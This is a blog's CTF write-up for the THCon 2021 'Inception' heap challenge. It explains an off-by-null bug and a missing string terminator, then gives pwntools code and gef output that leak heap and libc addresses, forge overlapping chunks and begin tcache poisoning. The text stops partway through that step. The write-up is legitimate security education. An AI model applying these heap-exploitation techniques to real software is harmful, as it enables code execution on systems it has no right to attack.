<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title> THCon 2021 - Inception - Slowerzs&#39; blog </title>
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320">
    <meta name="referrer" content="no-referrer">
    <meta name="description" content="" />
    <meta property="og:site_name" content="Slowerzs&#39; blog" />
    <meta property="og:locale" content="en_US" />
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://blog.slowerzs.net/archive/thcon-2021-inception/" />
    <meta property="og:title" content="THCon 2021 - Inception" />
    <meta property="og:image" content="https://blog.slowerzs.net/images/small-favicon.png" />
    <meta property="og:description" content="" />

    <meta name="twitter:card" content=" summary_large_image" />
    
    <meta name="twitter:title" content="THCon 2021 - Inception" />
    <meta name="twitter:description" content="" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@slowerzs">
    <meta name="twitter:image" content="https://blog.slowerzs.net/images/small-favicon.png" />

    <link rel="canonical" href="https://blog.slowerzs.net/archive/thcon-2021-inception/">

    <link rel="stylesheet" href="https://blog.slowerzs.net/css/bootstrap.min.css" />

    <link rel="stylesheet" href="https://blog.slowerzs.net/css/custom.css" />
    <link rel="stylesheet" href="https://blog.slowerzs.net/css/syntax.css" />

    

    <link rel="shortcut icon"
        href="https://blog.slowerzs.net/images/favicon.png?">

</head>

<body>
    <script>

        window.addEventListener('load', function () {
            hljs.configure({
                ignoreUnescapedHTML: true
            })
            hljs.highlightAll();
        }, true);

        let darkTheme = localStorage.getItem("darkTheme")
        if (darkTheme === null) {
            if (window.matchMedia("(prefers-color-scheme: dark)").matches) {
                document.documentElement.setAttribute('data-theme', 'dark');
                localStorage.setItem("darkTheme", true);
                document.getElementById("light-css").setAttribute('disabled', 'true')
                document.getElementById("dark-css").removeAttribute('disabled')
            } else {
                document.documentElement.setAttribute('data-theme', 'light');
                localStorage.setItem("darkTheme", false);
                document.getElementById("dark-css").setAttribute('disabled', 'true')
                document.getElementById("light-css").removeAttribute('disabled')
            }
        } else if (darkTheme === "true") {
            document.documentElement.setAttribute('data-theme', 'dark');
            document.getElementById("light-css").setAttribute('disabled', 'true')
            document.getElementById("dark-css").removeAttribute('disabled')
        } else {
            document.documentElement.setAttribute('data-theme', 'light');
            document.getElementById("dark-css").setAttribute('disabled', 'true')
            document.getElementById("light-css").removeAttribute('disabled')
        }

        function switchTheme() {
            let darkTheme = localStorage.getItem("darkTheme");
            if (darkTheme === null) {
                darkTheme = window.matchMedia("(prefers-color-scheme: dark)").matches.toString()
            }

            if (darkTheme === "true") {
                document.documentElement.setAttribute('data-theme', 'light');
                localStorage.setItem("darkTheme", false);
                document.getElementById("dark-css").setAttribute('disabled', 'true')
                document.getElementById("light-css").removeAttribute('disabled')
            } else {
                document.documentElement.setAttribute('data-theme', 'dark');
                localStorage.setItem("darkTheme", true);
                document.getElementById("light-css").setAttribute('disabled', 'true')
                document.getElementById("dark-css").removeAttribute('disabled')
            }

        }
    </script>
    
    <div class="mt-xl header">
    <div class="container">
        <div>
            <div class="row justify-content-center">
                <div class="row">
                    <a href="https://blog.slowerzs.net/">
                        <h1 class="name">Slowerzs&#39; blog</h1>
                    </a>
                    <img id="switcher" onclick="switchTheme()" src="https://blog.slowerzs.net/images/theme-dark.svg" height="32px" width="32px"
                        style="position: absolute; left: 93%; transform: translateX(-93%);" />
                </div>
            </div>

            <div class="row justify-content-center">
                <ul class="nav nav-primary">
                    
                    <li class="nav-item">
                        <a class="nav-link" href="https://blog.slowerzs.net/">
                            
                            Home
                        </a>
                    </li>
                    
                    <li class="nav-item">
                        <a class="nav-link" href="https://github.com/Slowerzs">
                            
                            Github
                        </a>
                    </li>
                    
                    <li class="nav-item">
                        <a class="nav-link" href="https://twitter.com/slowerzs">
                            
                            Twitter
                        </a>
                    </li>
                    
                    <li class="nav-item">
                        <a class="nav-link" href="https://blog.slowerzs.net/archive">
                            
                            Archive
                        </a>
                    </li>
                    
                </ul>
            </div>

        </div>
    </div>
</div>

    <div class="content">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-sm-12 col-lg-8">
                    <h1 class="mx-0 mx-md-4">THCon 2021 - Inception</h1>
                    <h6 class="mx-md-4 post-date">June 15, 2021</h6>
                </br>
                    <div class="markdown">
                        
    <h1 id="inception">Inception</h1>
<p>Inception was a binary exploitation challenge, created by <a href="https://twitter.com/voydstack">Voydstack</a>. It was a heap challenge, involving Seccomp.</p>
<h2 id="discovery">Discovery</h2>
<p>We are given the binary, the libc, as well as the path to the flag, <code>/home/user/flag.txt</code>. The version of the libc is 2.27.</p>
<p>Playing with the binary, it looks like a typical heap exploitation challenge : we can create <code>dreams</code> of any size lesser than 0x800 bytes, edit <code>dreams</code>, show their content, as well as delete them. Creating and deleting <code>dreams</code> is allocating and freeing chunks respectively.
Dreams are identified by an index.</p>
<pre tabindex="0"><code class="language-raw" data-lang="raw">-= Dream Book =-
1. Add dream
2. Delete dream
3. Edit dream
4. View dream
5. Exit
&gt; 1
Dream size: 100
Dream content: hello
Dream #0 created.
-= Dream Book =-
1. Add dream
2. Delete dream
3. Edit dream
4. View dream
5. Exit
&gt; 4
Dream index: 0
Dream content: hello

-= Dream Book =-
1. Add dream
2. Delete dream
3. Edit dream
4. View dream
5. Exit
&gt; 3
Dream index: 0
New dream content: there
-= Dream Book =-
1. Add dream
2. Delete dream
3. Edit dream
4. View dream
5. Exit
&gt; 4
Dream index: 0
Dream content: there

-= Dream Book =-
1. Add dream
2. Delete dream
3. Edit dream
4. View dream
5. Exit
&gt; 2
Dream index: 0
Dream deleted.
-= Dream Book =-
1. Add dream
2. Delete dream
3. Edit dream
4. View dream
5. Exit
&gt; 4
Dream index: 0
Empty dream.
</code></pre><p>Reviewing the mitigations, everything is enabled (we can safely assume that ASLR is enabled on the remote machine):</p>
<pre tabindex="0"><code class="language-raw" data-lang="raw">$ checksec inception
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre><p>By looking at the assembly, can also see that the program uses seccomp. Let&rsquo;s see the rules in details using <a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>.</p>
<pre tabindex="0"><code class="language-raw" data-lang="raw">$ seccomp-tools dump ./inception
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x08 0x00 0x00000000  if (A == read) goto 0012
 0004: 0x15 0x07 0x00 0x00000001  if (A == write) goto 0012
 0005: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0012
 0006: 0x15 0x05 0x00 0x0000000a  if (A == mprotect) goto 0012
 0007: 0x15 0x04 0x00 0x0000000f  if (A == rt_sigreturn) goto 0012
 0008: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0012
 0009: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0012
 0010: 0x15 0x01 0x02 0x000000e7  if (A == exit_group) goto 0012 else goto 0013
 0011: 0x06 0x00 0x00 0x00050005  return ERRNO(5)
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
</code></pre><p>It is a whitelist, that correctly checks the architecure, and only allows a few syscalls. We will need these informations later.</p>
<h2 id="the-vulnerabilities">The vulnerabilities</h2>
<p>There are two vulnerabilities in this binary.</p>
<p>Firstly, when adding a <code>dream</code>, the content of the dream is read using the <code>read</code> function, which does not append a null byte to the string, and no null bytes are added to ensure that the strings is terminated.
Thus, since the view functionnality prints a strings, it is possible to read any bytes following the content of a <code>dream</code> up until the first null byte encountered.</p>
<p>The second vulnerability is in the edit functionality, when trying to add a null byte at the end of the string, as highlighted here :</p>
<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">mov eax, dword [rbp - 8]    ; eax contains the index of the dream
cdqe
lea rdx, [rax*4]
lea rax, obj.dreams_size
mov eax, dword [rdx + rax]  ; eax = dream size
movsxd rdx, eax             ; size argument of read (dream size)
mov eax, dword [rbp - 8]
cdqe
lea rcx, [rax*8]
lea rax, obj.dreams
mov rax, qword [rcx + rax]
mov rsi, rax                ; address argument of read (address of the dream)
mov edi, 0                  ; stdin
call sym.imp.read
mov dword [rbp - 4], eax    ; eax = number of bytes read
mov eax, dword [rbp - 8]    ; eax = index of the dream
cdqe
lea rdx, [rax*8]
lea rax, obj.dreams
mov rdx, qword [rdx + rax] ; rdx = address of the corresponding dream
mov eax, dword [rbp - 4]   ; eax = number of bytes read
cdqe
add rax, rdx               ; Calculates the address by adding the number of byte read to the beginning of the chunk
mov byte [rax], 0          ; Write the null byte, this can be out of the chunk!
</code></pre><p>Let&rsquo;s review it :</p>
<p>First, it calls <code>read</code> to edit the content of the dream, with the size parameter equal to the size given when we added the dream. Then, it takes the return value from <code>read</code>, which is the number of bytes read, and adds to it the address of the dream, and writes a null byte there.
However, if we created a <code>dream</code> whose size was filling the content of the chunk given by <code>malloc</code>, when editing the chunk, we can write a null byte out of the chunk boundaries !</p>
<p>With these two vulnerabilities, it is enough to exploit this program.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Let&rsquo;s get a proper environnement to develop our exploit. I&rsquo;ll use <a href="https://github.com/Slowerzs/pwninit">pwninit</a> to get a version of the libc with debug symbols, as well as a matching <code>ld.so</code> that can load the given binary. It also creates a template file that uses <code>pwntools</code> with python for the challenge.</p>
<p>I&rsquo;ll also create helper functions that let me easily interact with the functionality of the program (the full python script is available below).</p>
<h3 id="leaking">Leaking</h3>
<p>Since both PIE and ASLR are enabled, we will need leaks before starting anything. In this case, we will need two leaks.</p>
<h4 id="leaking-the-heap">Leaking the heap</h4>
<p>We will need the base address of the heap for the last part of our exploitation, but it is easier to get it now. For this, we will use the first vulnerability, leveraging <code>tcache</code> bins. A more complete overview of the different aspects of <code>malloc</code> can be found on MallocInternals <a href="https://sourceware.org/glibc/wiki/MallocInternals">here</a>, but essentialy, <code>malloc</code> keeps track of freed chunks, and categorizes them differents bins - <code>tcache</code> being one of them. It contains several singly linked LIFO lists, each containning freed chunk, each list having a specific chunk size.</p>
<p>An example of freed <code>dreams</code> in a tcache bin :</p>
<pre tabindex="0"><code class="language-raw" data-lang="raw">0x55555555a250: 0x0000000000000000      0x0000000000000021 &lt;- metadata of chunk 1
0x55555555a260: 0x0000000000000000      0x000055555555a010 &lt;- data of freed chunk 1
0x55555555a270: 0x0000000000000000      0x0000000000000021 &lt;- metadata of chunk 2
0x55555555a280: 0x000055555555a260      0x000055555555a010 &lt;- data of freed chunk 2
</code></pre><p>In the above example, I freed chunk 1 then chunk 2, and in the data of chunk 2, the first 8 bytes are a pointer to the next chunk in the tcache bin. This is a heap address and a perfect target for our leak.</p>
<p>The first 8 bytes of the metadata are the size of the previous chunks, and the next 8 bytes are the size of the chunk. Since the size of a chunk is a multiple of 0x10 (0x8 on a 32 bits machine), the last bits are not useful, so the last 3 bits are reused as flags to manage the heap, notably the least significant bit is the flag <code>PREV_INUSE</code>, which indicates if the previous chunk is free or in user. Why is the previous size 0 and the <code>PREV_INUSE</code> set when I have freed both chunks ? This is becausethey are in the <code>tcache</code> which behaves differently - check out MallocInternals for the details :)</p>
<p>To actually get the value, we will create two <code>dreams</code> and free them to get in the above situation, then allocate a new <code>dream</code> with a content size of 1 (we cannot do 0 bytes), and then view its content. Since we are creating the chunk, we will overwrite the least significate byte of the pointer, but luckily for us, the base address of the heap is page aligned, which means that last 12 bits of the base address of the heap are zeros. We can therefore safely set these 12 bits to 0 to get our leak (ignoring the 8 bits we overwrote).</p>
<p>In newer version of the glibc, this is not as straightforward.</p>
<p>Scripting this in python, we get :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;azer&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;azer&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">heap_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">heap_leak</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span> <span class="c1"># Setting the last 12 bits to 0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap base : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>It works !</p>
<blockquote>
<p>[+] heap base : 0x55ab13e63000</p>
</blockquote>
<p>Now, we do some cleanup for what comes next :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span></code></pre></div><h3 id="leaking-libc">Leaking LIBC</h3>
<p>To get a libc leak, we need to get a libc address on the heap, which we could then leak using the same method. However, I&rsquo;ll do this using a different method : it is the first step to what comes next anyway.</p>
<h3 id="overlapping-chunks">Overlapping chunks</h3>
<p>For this, we will trick <code>malloc</code> in creating two overlapping chunks using the second vulnerability. This technique is explained in great depth <a href="https://devel0pment.de/?p=688">here</a> with some malloc internals. The idea relies on using the off by null to clear the least significant byte of the metadata of the next chunk, which indicates notably if the previous chunk is in use or not, and then make it coalesce two chunks that it thinks are adjacent, while they are not.</p>
<p>Let&rsquo;s go step by step.</p>
<p>First we will create 4 chunks, of different sizes (I will come back to the reasons for the sizes in a moment) and free the first one:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cccc&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;dddd&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></div><p>We have the following situation :</p>
<pre tabindex="0"><code class="language-raw" data-lang="raw">gef➤  heap chunks
...
Chunk(addr=0x55939522b260, size=0x500, flags=PREV_INUSE)
    [0x000055939522b260     a0 1c 4d 64 62 7f 00 00 a0 1c 4d 64 62 7f 00 00    ..Mdb.....Mdb...]
Chunk(addr=0x55939522b760, size=0x70, flags=)
    [0x000055939522b760     62 62 62 62 00 00 00 00 00 00 00 00 00 00 00 00    bbbb............]
Chunk(addr=0x55939522b7d0, size=0x500, flags=PREV_INUSE)
    [0x000055939522b7d0     63 63 63 63 00 00 00 00 00 00 00 00 00 00 00 00    cccc............]
Chunk(addr=0x55939522bcd0, size=0x210, flags=PREV_INUSE)
    [0x000055939522bcd0     64 64 64 64 00 00 00 00 00 00 00 00 00 00 00 00    dddd............]
</code></pre><pre tabindex="0"><code class="language-raw" data-lang="raw">gef➤  x/2gx 0x000055939522b260
0x55939522b260: 0x00007f62644d1ca0      0x00007f62644d1ca0
</code></pre><p>We have four chunk, the first one being free, while the other 3 are in use. We can see two libc address : this is why we chose a size of <code>0x4f0</code> for our dream : it creates a chunk of size <code>0x500</code>, which is too big to go in either the <code>tcache</code> or <code>fastbins</code>, so it ends up in the <code>unsorted bin</code>, which is a doubly linked list, whose head is in the libc, and the freed chunks have a forward and backward pointer to the list, this is why we have this address here. So we actually put a libc address on the heap.</p>
<p>Next, we will leverage the second vulnerability to clear the least signigicant bit of the <code>cccc</code> chunk, updating the <code>PREV_INUSE</code> flag. This is also why we <code>0x4F0</code> for the dream size, it creates a <code>0x500</code> chunk, and so while clearing this bit, we do not shrink the chunk size. This will make <code>malloc</code> think that the chunk <code>bbbb</code> is free while it actually is not.
This is not sufficient for our goal : we also need to update the <code>prev_size</code> field of the chunk <code>cccc</code> to make it think that the previous chunk is <code>aaaa</code>. Since this field is the first 8 bytes of the metadata of chunk <code>cccc</code>, this is also the last 8 bytes of chunk <code>bbbb</code>, which we can edit. So we will update it to be <code>0x570</code>, the size of chunk <code>aaaa</code> + <code>bbbb</code>, making it believe there is only one chunk before.</p>
<p>Let&rsquo;s continue our script :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x680</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cccc&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;dddd&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x570</span><span class="p">))</span> <span class="c1"># Set prev_size</span>
</span></span></code></pre></div><p>in our debugger, we get :</p>
<pre tabindex="0"><code class="language-raw" data-lang="raw">gef➤  heap chunks
...
Chunk(addr=0x564dbb2f4260, size=0x500, flags=PREV_INUSE)
    [0x0000564dbb2f4260     a0 ac 78 6c d5 7f 00 00 a0 ac 78 6c d5 7f 00 00    ..xl......xl....]
Chunk(addr=0x564dbb2f4760, size=0x70, flags=)
    [0x0000564dbb2f4760     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]
Chunk(addr=0x564dbb2f47d0, size=0x500, flags=)
    [0x0000564dbb2f47d0     63 63 63 63 00 00 00 00 00 00 00 00 00 00 00 00    cccc............]
Chunk(addr=0x564dbb2f4cd0, size=0x210, flags=PREV_INUSE)
    [0x0000564dbb2f4cd0     64 64 64 64 00 00 00 00 00 00 00 00 00 00 00 00    dddd............]
Chunk(addr=0x564dbb2f4ee0, size=0x20130, flags=PREV_INUSE)  ←  top chunk

gef➤  heap chunk 0x0000564dbb2f47d0
Chunk(addr=0x564dbb2f47d0, size=0x500, flags=)
Chunk size: 1280 (0x500)
Usable size: 1272 (0x4f8)
Previous chunk size: 1392 (0x570)
PREV_INUSE flag: Off
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
</code></pre><p>We have successfully changed the <code>PREV_INUSE</code> and <code>PREV_SIZE</code> values.</p>
<p>Now, all we have to do is free chunk <code>cccc</code>, which is big enough to not go in either the <code>tcache</code> or <code>fastbin</code>, and will then trigger the coalescing of the chunk (if this is not clear, check the MallocInternals link above).
The chunk will coalesce and merge with what it think is his adjacent chunk, which is <code>aaaa</code>instead of <code>bbbb</code>, creating a big free chunk that goes over <code>bbbb</code>, of size <code>0xa70</code>. This is also the reason why we need <code>dddd</code> : this way <code>cccc</code> is not merged with the top chunk (the size of <code>dddd</code> does not matter).</p>
<p>Let&rsquo;s update our script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x680</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cccc&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;dddd&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x570</span><span class="p">))</span> <span class="c1"># Set prev_size</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span></code></pre></div><p>And the result :</p>
<pre tabindex="0"><code class="language-raw" data-lang="raw">gef➤  heap chunks
...
Chunk(addr=0x55be450242a0, size=0xa70, flags=PREV_INUSE)
    [0x000055be450242a0     a0 0c f6 15 09 7f 00 00 a0 0c f6 15 09 7f 00 00    ................]
Chunk(addr=0x55be45024d10, size=0x210, flags=)
    [0x000055be45024d10     64 64 64 64 00 00 00 00 00 00 00 00 00 00 00 00    dddd............]
Chunk(addr=0x55be45024f20, size=0x200f0, flags=PREV_INUSE)  ←  top chunk

gef➤  heap bins
────────────────────────────── Tcachebins for arena 0x7f0915f60c40 ──────────────────────────────
Tcachebins[idx=0, size=0x20] count=2  ←  Chunk(addr=0x55be45024280, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55be45024260, size=0x20, flags=PREV_INUSE)
─────────────────────────────── Fastbins for arena 0x7f0915f60c40 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
────────────────────────────── Unsorted Bin for arena &#39;main_arena&#39; ──────────────────────────────
[+] unsorted_bins[0]: fw=0x55be45024290, bk=0x55be45024290
 →   Chunk(addr=0x55be450242a0, size=0xa70, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
─────────────────────────────── Small Bins for arena &#39;main_arena&#39; ───────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
─────────────────────────────── Large Bins for arena &#39;main_arena&#39; ───────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
</code></pre><p>We have succesfully coalesced the chunks ! (<code>gdb-gef</code> does not show chunk <code>bbbb</code> in the list, but it is still allocated and we still control it).</p>
<p>Now, to get our libc leak, all we have to do, is to allocate a <code>dream</code> of size <code>0x4f0</code>, since both the <code>tcache</code> and <code>fastbins</code> cannot give a chunk of the requested size, it will take a slice (this is possible because this chunk is in the <code>unsorted bin</code>) of the free chunk of size <code>0xa70</code> and push down the libc address right over the content of chunk <code>bbbb</code> (this is because the remaining <code>0x570</code> bytes chunk is still in the <code>unsorted bin</code>).</p>
<p>Viewing the content of <code>bbbb</code> should output a libc address.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cccc&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;dddd&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x570</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;push&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">view</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3ebca0</span> <span class="c1"># We find this offset using our debugger :)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc base : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>And we have a libc leak !</p>
<blockquote>
<p>[+] libc base : 0x7f5bebc37000</p>
</blockquote>
<h3 id="arbitrary-write--controlling-the-instruction-pointer">Arbitrary write &amp; Controlling the Instruction pointer</h3>
<p>So, why did we do all of this ? We could have freed a chunk into the <code>unsorted bin</code>, and used the first bug to leak the libc address.</p>
<p>Having two overlapping chunks is very useful for us : remember the size of <code>bbbb</code> - it is <code>0x70</code> bytes. Therefore, if we free it, it will end up in the corresponding <code>tcache</code>, and if you remember the beginning, the first 8 bytes are a pointer to the next free chunk in the same <code>tcache</code>. But since we have overlapping chunks, we can control this pointer ! Which means, if we make more allocations from the same <code>tcache</code>, we will get <code>bbbb</code> first, and then a fake chunk, at an address we can control, and so, we can write anywhere in memory !</p>
<p>Let&rsquo;s see this in action</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;eeee&#39;</span><span class="p">)</span>               <span class="c1"># Overlapping with &#34;bbbb&#34;, named &#34;eeee&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>                        <span class="c1"># We immediately free it</span>
